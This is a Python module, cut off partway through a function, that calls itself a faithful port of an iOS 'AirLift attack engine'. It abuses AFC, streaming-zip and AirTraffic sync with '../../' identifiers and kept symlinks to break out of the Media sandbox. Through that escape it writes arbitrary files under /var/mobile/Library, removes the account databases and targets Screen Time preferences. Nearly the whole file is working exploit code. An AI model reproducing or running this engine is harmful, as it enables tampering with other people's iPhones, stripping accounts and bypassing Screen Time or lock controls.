"""
airlift_attack.py
=================
Byte-exact Python re-implementation of the third-party iFineOpenHide
(IFineOpenHideWindows) AirLift attack engine, reverse engineered from the
IL dump (`AirliftWriter`).

The device protocol is reproduced faithfully:

  * AfcProbe / Preflight                 AFC write+readback + canary
  * Stage                                StreamingZip archive + Books.plist
  * SendStreamingZip                     com.apple.streaming_zip_conduit
  * Sync                                 Apple AirTrafficHost.dll (in-process)
  * WriteReliable                        linkset -> rename/linkdrop fallback
  * CreateKeptLinkToAirlock / ToTarget  directory symlink kept-links
  * DropLibraryLinkThroughKeptLink       symlink drop for /var/mobile/Library
  * MoveOutDevicePathsBatch              move-to-recovered + host remove
  * kept-link file writes / readbacks

Sync runs in-process through the bundled Apple AirTrafficHost.dll
(proven_native_lite, byte-identical to the third-party AppleSupport folder):
TLS / Grappa handshake / framing are produced live by Apple's framework.

Every literal path, canary text, mode constant, timing and ordering matches
the reference IL.  Device discovery / AFC / streaming zip transport also go
through Apple's own MobileDevice.dll in-process (`apple_native_wrapper`).
"""

from __future__ import annotations

import os
import sys
import time
import logging as _logging
from typing import Any, Callable

import apple_native_wrapper as lw
import payload_builder as pb

_vlog = _logging.getLogger("airlift_verify")


# ---------------------------------------------------------------------------
# Verbatim literals
# ---------------------------------------------------------------------------

SVC_AFC = "com.apple.afc"
SVC_SZC = "com.apple.streaming_zip_conduit"

AIRLOCK = "Airlock"
AIRLOCK_BOOK = "Airlock/Book"
MEDIA_AIRLOCK_BOOK = "/var/mobile/Media/Airlock/Book"
MEDIA_PREFIX = "/var/mobile/Media"
MEDIA_LIBRARY = "/var/mobile/Library"

# The nine account databases (device paths) that are removed during the
# hide flow.
ACCOUNT_DATABASES = (
    "/var/mobile/Library/Accounts/Accounts3.sqlite",
    "/var/mobile/Library/Accounts/Accounts3.sqlite-shm",
    "/var/mobile/Library/Accounts/Accounts3.sqlite-wal",
    "/var/mobile/Library/Accounts/Accounts4.sqlite",
    "/var/mobile/Library/Accounts/Accounts4.sqlite-shm",
    "/var/mobile/Library/Accounts/Accounts4.sqlite-wal",
    "/var/mobile/Library/Accounts/Accounts.sqlite",
    "/var/mobile/Library/Accounts/Accounts.sqlite-shm",
    "/var/mobile/Library/Accounts/Accounts.sqlite-wal",
)

SCREENTIME_PATH = "/var/mobile/Library/Preferences/com.apple.ScreenTimeAgent.plist"
SCREENTIME_REL = "Preferences/com.apple.ScreenTimeAgent.plist"

# Timings (milliseconds unless noted).
SLEEP_RENAME_VERIFY = 450
SLEEP_MOVEOUT_PER = 550
READBACK_RETRY_DELAY = 450
READBACK_RETRIES = 8
WAITSTAGE_ROUNDS = 8
WAITSTAGE_DELAY = 250


ProgressCB = Callable[[str, float], None]


def _noop(_msg: str, _pct: float) -> None:
    pass


def _utf8(value: str) -> bytes:
    return value.encode("utf-8")


# ---------------------------------------------------------------------------
# Random hex (lowercase, RNG bytes -> x2)
# ---------------------------------------------------------------------------

def random_hex(count: int) -> str:
    return os.urandom(count).hex()


# ---------------------------------------------------------------------------
# Bytes equal
# ---------------------------------------------------------------------------

def bytes_equal(a: bytes | None, b: bytes | None) -> bool:
    if a is None or b is None:
        return False
    if len(a) != len(b):
        return False
    diff = 0
    for x, y in zip(a, b):
        diff |= x ^ y
    return diff == 0


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

class AirliftEngine:
    """Stateful engine bound to one device.

    `report(percent, message)` receives an integer percent (0..100) and a
    message, mirroring the reference reporter.
    """

    def __init__(self, udid: str,
                 report: Callable[[int, str], None]):
        self.udid = udid
        self.report = report
        self._device = None
        self._lockdown = None
        self.afc: Any = None

    # -- connection lifecycle ---------------------------------------------

    def connect(self) -> None:
        self._device = lw.iDevice(self.udid)
        self._lockdown = lw.LockdownClient(self._device, handshake=True)
        svc = self._lockdown.start_service(SVC_AFC)
        self.afc = lw.AFCClient(self._device, svc)

    def close(self) -> None:
        for obj in ("afc",):
            try:
                o = getattr(self, obj, None)
                if o is not None:
                    o.free()
            except Exception:
                pass
            setattr(self, obj, None)
        try:
            if self._lockdown is not None:
                self._lockdown.free()
        except Exception:
            pass
        self._lockdown = None
        try:
            if self._device is not None:
                self._device.free()
        except Exception:
            pass
        self._device = None

    def __enter__(self) -> "AirliftEngine":
        self.connect()
        return self

    def __exit__(self, *exc) -> None:
        self.close()

    # -- AFC primitives ----------------------------------------------------

    def exists(self, path: str) -> bool:
        try:
            return bool(self.afc.file_exists(path))
        except Exception:
            return False

    def remove(self, path: str) -> bool:
        try:
            return bool(self.afc.remove_path(path))
        except Exception:
            return False

    def remove_tree(self, root: str) -> bool:
        if not root:
            return False
        try:
            entries = self.afc.read_directory(root)
        except Exception:
            entries = None
        if entries:
            for entry in entries:
                if entry in (".", ".."):
                    continue
                child = root.rstrip("/") + "/" + entry
                info = None
                try:
                    info = self.afc.get_file_info(child)
                except Exception:
                    info = None
                is_dir = False
                if info:
                    st = info.get("st_ifmt") or info.get("ifmt") or ""
                    is_dir = "dir" in str(st).lower()
                if is_dir:
                    self.remove_tree(child)
                else:
                    self.remove(child)
        return self.remove(root)

    def ensure_dir_returns(self, path: str) -> bool:
        """device.EnsureDir: create the Book-relative dir; True on success."""
        if not path:
            return False
        if self.exists(path):
            return True
        parent = path.rpartition("/")[0]
        if parent:
            if not self.ensure_dir_returns(parent):
                return False
        try:
            self.afc.make_directory(path)
        except Exception:
            return self.exists(path)
        return self.exists(path)

    def ensure_dir(self, path: str) -> None:
        if not path:
            return
        if self.exists(path):
            return
        parent = path.rpartition("/")[0]
        if parent:
            self.ensure_dir(parent)
        try:
            self.afc.make_directory(path)
        except Exception:
            pass

    def write_file(self, path: str, data: bytes) -> bool:
        try:
            return bool(self.afc.write_file(path, data))
        except Exception as e:
            import os as _os, datetime as _dt
            line = "[%s] [engine] write_file(%s) EXCEPTION: %s\n" % (
                _dt.datetime.now().strftime("%H:%M:%S"), path, e)
            for d in [_os.path.join(_os.path.expanduser("~"), "Desktop"),
                      _os.environ.get("TEMP", "")]:
                if d:
                    try:
                        with open(_os.path.join(d, "afc_diag.log"), "a",
                                  encoding="utf-8") as f:
                            f.write(line)
                    except Exception:
                        pass
            return False

    def read_file(self, path: str, max_size: int) -> bytes | None:
        try:
            return self.afc.read_file(path, max_size=max_size)
        except Exception as e:
            import os as _os, datetime as _dt
            line = "[%s] [engine] read_file(%s) EXCEPTION: %s\n" % (
                _dt.datetime.now().strftime("%H:%M:%S"), path, e)
            for d in [_os.path.join(_os.path.expanduser("~"), "Desktop"),
                      _os.environ.get("TEMP", "")]:
                if d:
                    try:
                        with open(_os.path.join(d, "afc_diag.log"), "a",
                                  encoding="utf-8") as f:
                            f.write(line)
                    except Exception:
                        pass
            return None

    def rename(self, src: str, dst: str) -> bool:
        """AFC rename (Apple AFCRenamePath via the native transport)."""
        try:
            return bool(self.afc.rename(src, dst))
        except Exception:
            return False

    def list_dir(self, path: str) -> list[str]:
        try:
            return list(self.afc.read_directory(path) or [])
        except Exception:
            return []

    # -- readback ----------------------------------------------------------

    def readback_with_retry(self, path: str, expected: bytes) -> bool:
        for _ in range(READBACK_RETRIES):
            data = self.read_file(path, len(expected) + 64)
            if data is not None and bytes_equal(data, expected):
                return True
            time.sleep(READBACK_RETRY_DELAY / 1000.0)
        return False

    def verify_device_file_via_sync(self, device_path: str,
                                    expected: bytes, base_progress: int
                                    ) -> bool:
        """Read back a file that lives OUTSIDE the Media sandbox.

        AFC is jailed to ``/var/mobile/Media`` and refuses to follow symlinks
        that escape it, so a direct ``read_file`` through the kept link
        returns None even after a successful write.  Instead, issue a fresh
        AirTraffic sync with one identifier (the real target) and one
        destination (a Media-internal recovered file); the device copies the
        real bytes back into Media where AFC can read them.
        """
        recovered = "airlift-recovered-" + random_hex(10)
        identifier = self.airlock_identifier_for(device_path)
        # Add a no-op pair for a Media/Book-internal probe file that we
        # create first.
        probe = "airlift-probe-" + random_hex(8) + ".bin"
        ids = [identifier, probe]
        dsts = [recovered, probe]
        books = pb.build_books(ids)
        try:
            # Identifier source is Book-relative; create the probe there.
            self.ensure_dir(AIRLOCK_BOOK)
            if not self.write_file(AIRLOCK_BOOK + "/" + probe,
                                   _utf8("probe\n")):
                raise RuntimeError("probe 文件写入失败。")
            self.ensure_dir("Books")
            self.ensure_dir("Books/Sync")
            if not self.write_file("Books/Sync/Books.plist", books):
                raise RuntimeError("Books/Sync/Books.plist 写入失败。")
            # Destinations are resolved relative to the Media (AFC) root.
            self.sync(ids, dsts, base_progress + 4)
            ok = self.readback_with_retry(recovered, expected)
            if not ok:
                import hashlib as _hl
                got = self.read_file(recovered, len(expected) + 4096)
                glen = 0 if got is None else len(got)
                gh = "" if got is None else _hl.sha256(got).hexdigest()[:16]
                eh = _hl.sha256(expected).hexdigest()[:16]
                _vlog.info("verify_via_sync MISMATCH device_path=%s", device_path)
                _vlog.info("  identifier=%s recovered=%s", identifier, recovered)
                _vlog.info("  expected len=%s sha=%s", len(expected), eh)
                _vlog.info("  got isNone=%s len=%s sha=%s", got is None, glen, gh)
                # Also probe the target via the Book-relative recovered copy.
                brk = self.read_file(AIRLOCK_BOOK + "/" + recovered,
                                     len(expected) + 4096)
                _vlog.info("  book-recovered isNone=%s len=%s",
                           brk is None, 0 if brk is None else len(brk))
            return ok
        finally:
            try:
                self.remove(recovered)
                self.remove(AIRLOCK_BOOK + "/" + probe)
                self.clean_books_files()
            except Exception:
                pass

    # -- staging dirs / books cleanup --------------------------------------

    def books_absent(self) -> bool:
        for f in pb.BOOKS_FILES:
            if self.exists(f):
                return False
        return True

    def clean_books_files(self) -> None:
        for f in pb.BOOKS_FILES:
            self.remove(f)

    def should_remove_generated(self, name: str) -> bool:
        for prefix in pb.GENERATED_PREFIXES:
            if name == prefix or name.startswith(prefix):
                return True
        if name.startswith("airlift-canary-"):
            return True
        return False

    def clean_staging(self, full: bool) -> None:
        self.clean_books_files()
        if full:
            seen: set[str] = set()
            for base in ("", "/"):
                for entry in self.list_dir(base):
                    if entry in (".", "..") or entry in seen:
                        continue
                    seen.add(entry)
                    if self.should_remove_generated(entry):
                        self.remove_tree(entry.strip("/"))

    def ensure_airlock_book(self) -> None:
        for d in ("Airlock", "Airlock/Book", "Books", "Books/Sync",
                  "Books/Sync/Database"):
            self.ensure_dir(d)

    # -- path translation (SplitDevicePath / RelativePath / Identifier) ----

    @staticmethod
    def _split_device_path(value: str) -> list[str]:
        arg = "" if value is None else value
        normalized = arg.replace("\\", "/")
        # String.Split(new []{'/'}) with RemoveEmptyEntries semantics.
        return [seg for seg in normalized.split("/") if seg]

    def _relative_path(self, target: str, base: str) -> str:
        target_parts = self._split_device_path(target)
        base_parts = self._split_device_path(base)
        # IL loop: i starts at 0, is incremented to 1 before the first
        # comparison, so segments are compared from index 1 onward.
        i = 0
        while True:
            i += 1
            if i >= len(target_parts):
                break
            if i >= len(base_parts):
                break
            if not target_parts[i].__eq__(base_parts[i]):
                parts = [".."] * (len(base_parts) - i)
                parts.extend(target_parts[i:])
                return "/".join(parts)
        # Parts compared equal up to i; build tail from current i.
        parts = [".."] * (len(base_parts) - i)
        j = i
        while j < len(target_parts):
            parts.append(target_parts[j])
            j += 1
        if not parts:
            return "."
        return "/".join(parts)

    def airlock_identifier_for(self, device_path: str) -> str:
        relative = self._relative_path(
            device_path, "/var/mobile/Media/Airlock/Book")
        if not relative or not relative.strip():
            raise RuntimeError("AirTraffic identifier 无效: " + str(device_path))
        # A rooted result (leading slash) is invalid as an identifier.
        if relative[0] == "/":
            raise RuntimeError("AirTraffic identifier 无效: " + str(device_path))
        return relative.replace("\\", "/")


    # -- AFC probe ---------------------------------------------------------

    def afc_probe(self) -> None:
        probe_name = "airlift-afc-probe-" + random_hex(8) + ".bin"
        probe_bytes = _utf8("airlift readback probe\nnonce="
                            + random_hex(16) + "\n")
        # 诊断日志
        def _diag(msg):
            import os as _os, datetime as _dt
            line = "[%s] [afc_probe] %s\n" % (
                _dt.datetime.now().strftime("%H:%M:%S"), msg)
            for d in [_os.path.join(_os.path.expanduser("~"), "Desktop"),
                      _os.environ.get("TEMP", "")]:
                if d:
                    try:
                        with open(_os.path.join(d, "afc_diag.log"), "a",
                                  encoding="utf-8") as f:
                            f.write(line)
                    except Exception:
                        pass
        _conn_val = self.afc._conn.value if (getattr(self.afc, '_conn', None) and self.afc._conn.value) else 0
        _diag("conn=%s svc=%s" % (
            hex(_conn_val),
            getattr(self.afc, '_svc_name', '?')))
        try:
            _diag("write %s (%d bytes)" % (probe_name, len(probe_bytes)))
            if not self.write_file(probe_name, probe_bytes):
                _diag("write_file returned False")
                raise RuntimeError("AFC 探测/回读失败(写入)，请重新信任设备后再试。")
            _diag("write OK, reading back")
            data = self.read_file(probe_name, len(probe_bytes) + 16)
            _diag("read_file -> %s" % (
                "%d bytes" % len(data) if data else "None"))
            if not bytes_equal(data, probe_bytes):
                _diag("data mismatch got=%r" % (data[:60] if data else None))
                raise RuntimeError("AFC 探测/回读失败(回读不一致)，请重新信任设备后再试。")
            _diag("probe OK")
        finally:
            self.remove(probe_name)

    # -- streaming zip / stage ---------------------------------------------

    def send_streaming_zip(self, target_dir: str, archive: bytes,
                           prog: int) -> None:
        # Fresh device/lockdown for the conduit (matches service lifecycle).
        device = lw.iDevice(self.udid)
        try:
            lockdown = lw.LockdownClient(device, handshake=True)
            try:
                desc = lockdown.start_service(SVC_SZC)
                szc = lw.StreamingZipConduitClient(device, desc)
                try:
                    szc.send_zip(target_dir, archive)
                finally:
                    szc.free()
            finally:
                lockdown.free()
        finally:
            device.free()
        self.report(prog + 1, "StreamingZip: archive sent.")

    def wait_for_stage_payload(self, src: str, link_path: str,
                               payload_path: str | None) -> tuple[bool, str]:
        for _ in range(WAITSTAGE_ROUNDS):
            time.sleep(WAITSTAGE_DELAY / 1000.0)
            have_src = self.exists(src)
            have_link = self.exists(link_path)
            have_payload = True if payload_path is None else self.exists(payload_path)
            if have_src and have_link and have_payload:
                return True, "source/link/payload ready"
        detail = (f"source={self.exists(src)}, link={self.exists(link_path)}, "
                  f"payload={self.exists(payload_path) if payload_path else 'n/a'}")
        return False, detail

    def stage(self, src: str, archive: bytes, books: bytes,
              prog: int, leaf_name: str, require_payload: bool) -> None:
        if not self.books_absent():
            raise RuntimeError("Stage 前置条件失败，Books 残留未清理。")
        if not self.exists(src):
            raise RuntimeError("Stage 前置条件失败，source 目录缺失。")
        payload_path = src + "/payload"
        link_path = src + "/p0/p1/p2/" + (leaf_name or "link")

        self.remove_tree(src)
        self.report(prog + 1, "StreamingZip: binary stage...")
        self.send_streaming_zip(src, archive, prog + 2)
        wait_payload = payload_path if require_payload else None
        ok, detail = self.wait_for_stage_payload(src, link_path, wait_payload)
        if not ok:
            raise RuntimeError("StreamingZip stage 未落地: " + detail)
        self.report(prog + 4, "StreamingZip: stage ready.")
        self.ensure_dir("Books")
        self.ensure_dir("Books/Sync")
        if not self.write_file("Books/Sync/Books.plist", books):
            raise RuntimeError("Books/Sync/Books.plist 写入失败。")

    # -- sync (Apple 原生 AirTrafficHost.dll，与第三方一致) ----------------

    def sync(self, identifiers: list[str], destinations: list[str],
             base_progress: int, return_result: bool = False):
        if len(identifiers) != len(destinations):
            raise RuntimeError("Sync identifiers/destinations 数量不一致。")

        # 直接在本进程内 ctypes 调用苹果官方 AirTrafficHost.dll；TLS/Grappa
        # 握手/封帧全部由 Apple 框架完成，不再重放任何外部 exe。
        from atc_native_bridge import native_airtraffic

        class _Plan:
            pass

        plan = _Plan()
        plan.identifiers = list(identifiers)
        plan.destinations = list(destinations)

        def progress(text: str, ratio: float):
            try:
                p = base_progress + int(max(0.0, min(1.0, float(ratio))) * 10)
            except Exception:
                p = base_progress
            self.report(p, str(text))

        result = native_airtraffic(self.udid, plan, progress)
        if not result.get("ok"):
            raise RuntimeError(str(result.get("error") or "AirTraffic 投递失败。"))
        self.report(base_progress + 10,
                    "AirTrafficHost 投递完成 (assets=%d)."
                    % result.get("fileCompleteMessages", len(identifiers)))
        if return_result:
            return result
        return

    # -- media-relative / verify -------------------------------------------

    @staticmethod
    def is_media_target(path: str) -> bool:
        return bool(path) and path.startswith(MEDIA_PREFIX)

    @staticmethod
    def media_relative(dir_path: str, name: str) -> str:
        rel = dir_path[len(MEDIA_PREFIX):].strip("/")
        if not rel:
            return name
        return "/" + rel + name

    def verify_through_link(self, final_path: str, name: str,
                            dir_path: str, payload: bytes) -> tuple[bool, str]:
        if self.readback_with_retry(final_path, payload):
            return True, "link-readback"
        if self.is_media_target(dir_path):
            rel = self.media_relative(dir_path, name)
            data = self.read_file(rel, len(payload) + 16)
            if data is not None and bytes_equal(data, payload):
                return True, "media-target"
        return False, "readback unavailable"

    # -- delivery paths -----------------------------------------------------

    def deliver_by_airtraffic_linkset(self, dir_path: str, name: str,
                                      payload: bytes, prog: int
                                      ) -> dict[str, Any]:
        hexid = random_hex(10)
        src = "airlift-src-" + hexid
        link = "airlift-link-" + hexid
        recovered = "airlift-recovered-" + hexid

        # 第三方 linkset 为 2 对 identifier（link + payload）。
        id_link = "../../" + src + "/p0/p1/p2/link"
        id_payload = "../../" + src + "/payload"
        identifiers = [id_link, id_payload]
        destinations = [link, link + "/" + name]

        archive = pb.build_link_archive("link", dir_path, payload)
        books = pb.build_books(identifiers)

        self.report(prog, "开始 StreamingZip 投递...")
        self.clean_staging(False)
        self.ensure_dir(src)
        self.stage(src, archive, books, prog, "link", True)
        self.sync(identifiers, destinations, prog + 6)

        # 第三方回读：VerifyThroughLink（内部先沿 link 读，不通过再
        # 对 Media 内目标直读比对）。
        verified, detail = self.verify_through_link(
            link + "/" + name, name, dir_path, payload)
        self.cleanup(src, link, recovered)
        return {"synchronized": True, "verified": verified,
                "mode": "linkset", "detail": detail}

    def deliver_by_kept_link_rename(self, dir_path: str, name: str,
                                    payload: bytes, prog: int
                                    ) -> dict[str, Any]:
        """1:1 port of third-party DeliverByKeptLinkRename."""
        hexid = random_hex(10)
        src = "airlift-src-" + hexid
        link = "airlift-link-" + hexid

        # 第三方为 1 对 identifier（只 link）。stage payload 仅用于生成
        # 指向目标目录的 kept symlink，内容固定 linkkeep/nonce。
        id_link = "../../" + src + "/p0/p1/p2/link"
        identifiers = [id_link]
        destinations = [link]

        linkkeep = _utf8("airlift linkkeep\nnonce=" + hexid + "\n")
        archive = pb.build("link", dir_path, linkkeep)
        books = pb.build_books(identifiers)

        tmp = link + "/" + name + ".tmp-" + hexid
        final = link + "/" + name

        self.report(prog, "启用 rename/linkdrop 备用链路...")
        self.clean_staging(False)
        self.ensure_dir(src)
        self.stage(src, archive, books, prog, "link", True)
        self.sync(identifiers, destinations, prog + 6)

        if not self.exists(link):
            self.cleanup(src, link, None)
            raise RuntimeError("linkdrop 未生成 kept link。")

        # 写 tmp 再 rename 到 final；失败则直接写 final。
        renamed = False
        self.remove(tmp)
        if self.write_file(tmp, payload):
            if self.rename(tmp, final):
                renamed = True
            else:
                renamed = bool(self.write_file(final, payload))
        else:
            renamed = bool(self.write_file(final, payload))
        if not self.exists(final):
            self.cleanup(src, link, None)
            raise RuntimeError("通过 kept link 写入失败。")

        # 第三方只做 VerifyThroughLink（内部含 media-target 回退），
        # 不再另起 recovered sync。
        verified, detail = self.verify_through_link(
            final, name, dir_path, payload)
        mode = "rename/linkdrop" if renamed else "linkdrop-write"
        self.cleanup(src, link, None)
        return {"synchronized": True, "verified": verified,
                "mode": mode, "detail": detail}

    def write_reliable(self, target: str, payload: bytes,
                       require_sync: bool, base_progress: int,
                       verify: bool) -> dict[str, Any]:
        """1:1 port of the third-party WriteReliable.

        Success is driven by ``synchronized`` (the AirTraffic delivery ran
        to completion without throwing). ``verified`` (byte readback) is only
        an extra confirmation and is NEVER a hard gate for the real write,
        because the Preferences domain readback is unreliable. Only the
        preflight canary insists on a verified readback.
        """
        if not payload:
            raise RuntimeError("payload 为空。")
        slash = target.rfind("/")
        dir_path = target[:slash] if slash >= 0 else ""
        name = target[slash + 1:] if slash >= 0 else target
        if not (len(dir_path) > 1 and name):
            raise RuntimeError("目标路径无效: " + target)

        errors: list[str] = []
        linkset: dict[str, Any] | None = None

        # Path 1: linkset. Accept on verified readback, or (when sync is not
        # required) without it — mirrors the third-party branch
        # ``if (res.Verified || !requireSync)``.
        try:
            res = self.deliver_by_airtraffic_linkset(
                dir_path, name, payload, base_progress)
            linkset = res
            if res["verified"] or not require_sync:
                return res
            errors.append("linkset 未回读校验: " + str(res.get("detail")))
        except Exception as exc:
            errors.append("linkset: " + str(exc))

        # Path 2: rename/linkdrop. Accept when verified OR synchronized.
        try:
            res = self.deliver_by_kept_link_rename(
                dir_path, name, payload, base_progress + 9)
            if res["verified"] or res["synchronized"]:
                return res
            errors.append("rename/linkdrop 未完成: " + str(res.get("detail")))
        except Exception as exc:
            errors.append("rename/linkdrop: " + str(exc))

        # Fallback: if the linkset delivery actually synchronized, treat it
        # as success even without a confirmed readback.
        if linkset is not None and linkset.get("synchronized"):
            return linkset

        raise RuntimeError("写入链路失败: " + " | ".join(errors))

    # -- public write (preflight canary style) ------------------------------

    def write(self, target: str, payload: bytes, progress: int) -> None:
        res = self.write_reliable(target, payload, False, progress, False)
        if not res["synchronized"]:
            raise RuntimeError("Airlift 写入失败: " + str(res.get("detail")))
        detail = "，回读已校验" if res["verified"] else "，已完成投递"
        self.report(progress,
                    "Airlift 写入完成(" + res["mode"] + detail + "): " + target)

    # -- preflight ----------------------------------------------------------

    def preflight(self, progress: int) -> None:
        self.report(progress, "准备设备同步环境...")
        self.clean_staging(True)
        self.ensure_dir("Books")
        self.ensure_dir("Books/Sync")
        self.ensure_dir("Books/Sync/Database")
        self.afc_probe()
        self.report(progress + 2, "AFC 探测通过。")

        canary_name = "airlift-canary-" + random_hex(8) + ".bin"
        canary = _utf8("airlift canary\n"
                       + random_hex(24) + "\n")
        target = MEDIA_PREFIX + "/" + canary_name
        res = self.write_reliable(target, canary, True, progress + 3, True)
        if not res["verified"]:
            raise RuntimeError("AirLift canary 未通过回读校验。")
        self.remove(canary_name)
        self.clean_staging(False)
        self.report(progress + 10, "探测、清理、回读均通过。")

    # -- kept links ---------------------------------------------------------

    def create_kept_link_to_airlock(self, progress: int) -> str:
        hexid = random_hex(10)
        src = "airlift-src-" + hexid
        link = "airlift-link-" + hexid
        canary_name = "airlift-canary-" + hexid + ".bin"
        canary = _utf8("airlift canary\nkeep=true\nnonce=" + hexid + "\n")

        id_link = "../../" + src + "/p0/p1/p2/link"
        id_payload = "../../" + src + "/payload"
        identifiers = [id_link, id_payload]
        destinations = [link, link + "/" + canary_name]

        archive = pb.build_link_archive("link",
                                        MEDIA_AIRLOCK_BOOK, canary)
        books = pb.build_books(identifiers)

        try:
            self.clean_staging(False)
            self.ensure_airlock_book()
            self.ensure_dir(src)
            self.stage(src, archive, books, progress + 1, "link", 1)
            self.sync(identifiers, destinations, progress + 4)

            if not self.readback_with_retry("Airlock/Book/" + canary_name, canary):
                raise RuntimeError("canary keep-link 未回读到目标文件。")
            if not self.readback_with_retry(link + "/" + canary_name, canary):
                raise RuntimeError("canary keep-link 未回读到目标文件。")
            self.remove("Airlock/Book/" + canary_name)
            self.report(progress + 10, "Lift 流程: canary/keptLink 通过。")
            return link
        finally:
            self.remove_tree(src)
            self.clean_books_files()

    def create_kept_link_to_target(self, target_tail: str, progress: int,
                                   label: str) -> str:
        hexid = random_hex(10)
        src = "airlift-src-" + hexid
        link = "airlift-link-" + hexid
        recovered = "airlift-recovered-" + hexid
        canary_name = "airlift-canary-" + hexid + ".bin"
        # IL canary: airlift canary\nkeep=true\ntarget=<target>\nnonce=<hex>\n
        canary = _utf8("airlift canary\nkeep=true\ntarget=" + target_tail
                       + "\nnonce=" + hexid + "\n")

        # Airlock identifier for target.TrimEnd('/') + '/' + canary_name.
        canary_device_path = target_tail.rstrip("/") + "/" + canary_name
        id_canary = self.airlock_identifier_for(canary_device_path)
        id_link = "../../" + src + "/p0/p1/p2/link"
        id_payload = "../../" + src + "/payload"
        identifiers = [id_link, id_payload, id_canary]
        destinations = [link, link + "/" + canary_name, recovered]

        archive = pb.build_link_archive("link", target_tail, canary)
        books = pb.build_books(identifiers)

        kept_canary_path = link + "/" + canary_name
        try:
            self.report(progress,
                        "Lift 流程: keep-link " + label + "...")
            self.clean_staging(False)
            self.ensure_dir(src)
            self.stage(src, archive, books, progress + 1, "link", True)
            self.sync(identifiers, destinations, progress + 4)

            if not self.exists(link):
                raise RuntimeError("kept link 未生成: " + link)

            # Read canary from recovered first, then through the kept link.
            if not self.readback_with_retry(recovered, canary):
                if not self.readback_with_retry(kept_canary_path, canary):
                    raise RuntimeError(
                        "finishkeep canary 未回收: recovered=" + recovered
                        + ", kept=" + kept_canary_path)

            self.remove(kept_canary_path)
            self.remove(recovered)
            self.report(progress + 14,
                        "Lift 流程: keep-link " + label + " 已建立。")
            return link
        finally:
            try:
                self.remove(recovered)
                self.remove_tree(src)
                for books_file in pb.BOOKS_FILES:
                    self.remove(books_file)
            except Exception:
                pass

    def drop_library_link_through_kept_link(self, kept_link: str,
                                            progress: int) -> None:
        hexid = random_hex(10)
        src = "airlift-src-" + hexid
        canary_name = "airlift-canary-" + hexid + ".bin"
        canary = _utf8("airlift linkdrop through canary\nleaf=Library\nnonce="
                       + hexid + "\n")

        id_link = "../../" + src + "/p0/p1/p2/link2"
        id_payload = "../../" + src + "/payload"
        identifiers = [id_link, id_payload]
        destinations = [kept_link + "/Library", kept_link + "/" + canary_name]

        archive = pb.build_link_archive("link2", MEDIA_LIBRARY, canary)
        books = pb.build_books(identifiers)

        try:
            self.report(progress, "Lift 流程: linkdrop Library...")
            self.clean_books_files()
            self.remove("Airlock/Book/Library")
            self.ensure_dir(src)
            self.stage(src, archive, books, progress + 1, "link2", 1)
            self.sync(identifiers, destinations, progress + 4)

            if not self.readback_with_retry(
                    "Airlock/Book/Library/" + canary_name, canary):
                raise RuntimeError("linkdrop Library 未回读到目标文件。")
            if not self.readback_with_retry(
                    kept_link + "/Library/" + canary_name, canary):
                raise RuntimeError("linkdrop Library kept-link 未回读。")
            self.report(progress + 10, "Lift 流程: linkdrop Library 通过。")
        finally:
            self.remove_tree(src)
            self.clean_books_files()

    # -- move out -----------------------------------------------------------

    def kind(self, path: str) -> str:
        """device.Kind: AFC st_ifmt for a Book-relative path; '' if missing."""
        try:
            info = self.afc.get_file_info(path)
        except Exception:
            info = None
        if not info:
            return ""
        return str(info.get("st_ifmt") or info.get("ifmt") or "")

    def move_out_device_paths_batch(self, device_paths: list[str],
                                    base_progress: int,
                                    label: str) -> int:
        """
        Faithful port of MoveOutDevicePathsBatch.
        Returns the number of recovered artifacts observed (and cleaned up).
        Sync calls are batched (max 3 identifiers per call) to avoid
        'too many assets' errors during AirTraffic delivery.
        """
        if not device_paths:
            return 0

        identifiers: list[str] = []
        recovered_names: list[str] = []
        recovered_for_check: list[str] = []

        index = 0
        for device_path in device_paths:
            if device_path is None or not device_path.strip():
                continue
            recovered = ("airlift-recovered-" + random_hex(10) + "-"
                         + str(index))
            identifiers.append(self.airlock_identifier_for(device_path))
            recovered_names.append(recovered)
            recovered_for_check.append(recovered)
            index += 1

        if not identifiers:
            return 0

        # 分批大小，避免 AirTraffic 投递报 too many assets
        BATCH_SIZE = 3

        try:
            # Remove any leftover Books snapshot files.
            for books_file in pb.BOOKS_FILES:
                try:
                    self.remove(books_file)
                except Exception:
                    pass
            for recovered in recovered_for_check:
                try:
                    self.remove_tree(recovered)
                except Exception:
                    pass

            self.ensure_airlock_book()
            if not self.ensure_dir_returns("Books"):
                raise RuntimeError("Books 目录建立失败。")
            if not self.ensure_dir_returns("Books/Sync"):
                raise RuntimeError("Books/Sync 目录建立失败。")

            # 分批 sync，每批最多 BATCH_SIZE 个 identifier
            total = len(identifiers)
            for batch_start in range(0, total, BATCH_SIZE):
                batch_end = min(batch_start + BATCH_SIZE, total)
                batch_ids = identifiers[batch_start:batch_end]
                batch_dests = recovered_names[batch_start:batch_end]

                books_plist = pb.build_books(batch_ids)
                if not self.write_file("Books/Sync/Books.plist", books_plist):
                    raise RuntimeError("Books/Sync/Books.plist 写入失败。")

                self.report(base_progress,
                            f"Lift 流程: AirTraffic moveout {label} "
                            f"(batch {batch_start // BATCH_SIZE + 1})...")
                self.sync(batch_ids, batch_dests, base_progress + 1)

            observed = 0
            rounds = 0
            while True:
                observed = 0
                for recovered in recovered_for_check:
                    if self.exists(recovered):
                        observed += 1
                if observed > 0:
                    break
                time.sleep(0.300)
                rounds += 1
                if rounds >= 12:
                    break

            # Whether timed out or saw some recovered, remove them all.
            cleaned = 0
            for recovered in recovered_for_check:
                if self.exists(recovered):
                    if not self.remove_tree(recovered):
                        raise RuntimeError("recovered 清理失败: " + recovered)
                    time.sleep(0.120)
                    if self.exists(recovered):
                        raise RuntimeError(
                            "recovered 清理后仍存在: " + recovered)
                    cleaned += 1
            return cleaned
        finally:
            # Defensive cleanup of recovered + Books snapshot files.
            for recovered in recovered_for_check:
                try:
                    self.remove_tree(recovered)
                except Exception:
                    pass
            for books_file in pb.BOOKS_FILES:
                try:
                    self.remove(books_file)
                except Exception:
                    pass

    def move_out_and_remove_device_path(self, device_path: str,
                                        base_progress: int,
                                        label: str) -> bool:
        return self.move_out_device_paths_batch(
            [device_path], base_progress, label) > 0

    def delete_accounts_through_kept_library(self, afc_kept_link: str,
                                             base_progress: int) -> None:
        # 逐字节对标第三方 AirliftWriter.DeleteAccountsThroughKeptLibrary。
        if afc_kept_link is None or not afc_kept_link.strip():
            raise RuntimeError("Library kept link 为空。")
        if not self.exists(afc_kept_link):
            raise RuntimeError("Library kept link 不存在: " + afc_kept_link)

        details: list[str] = []

        # 1) 先把整个 Accounts 目录 move out。
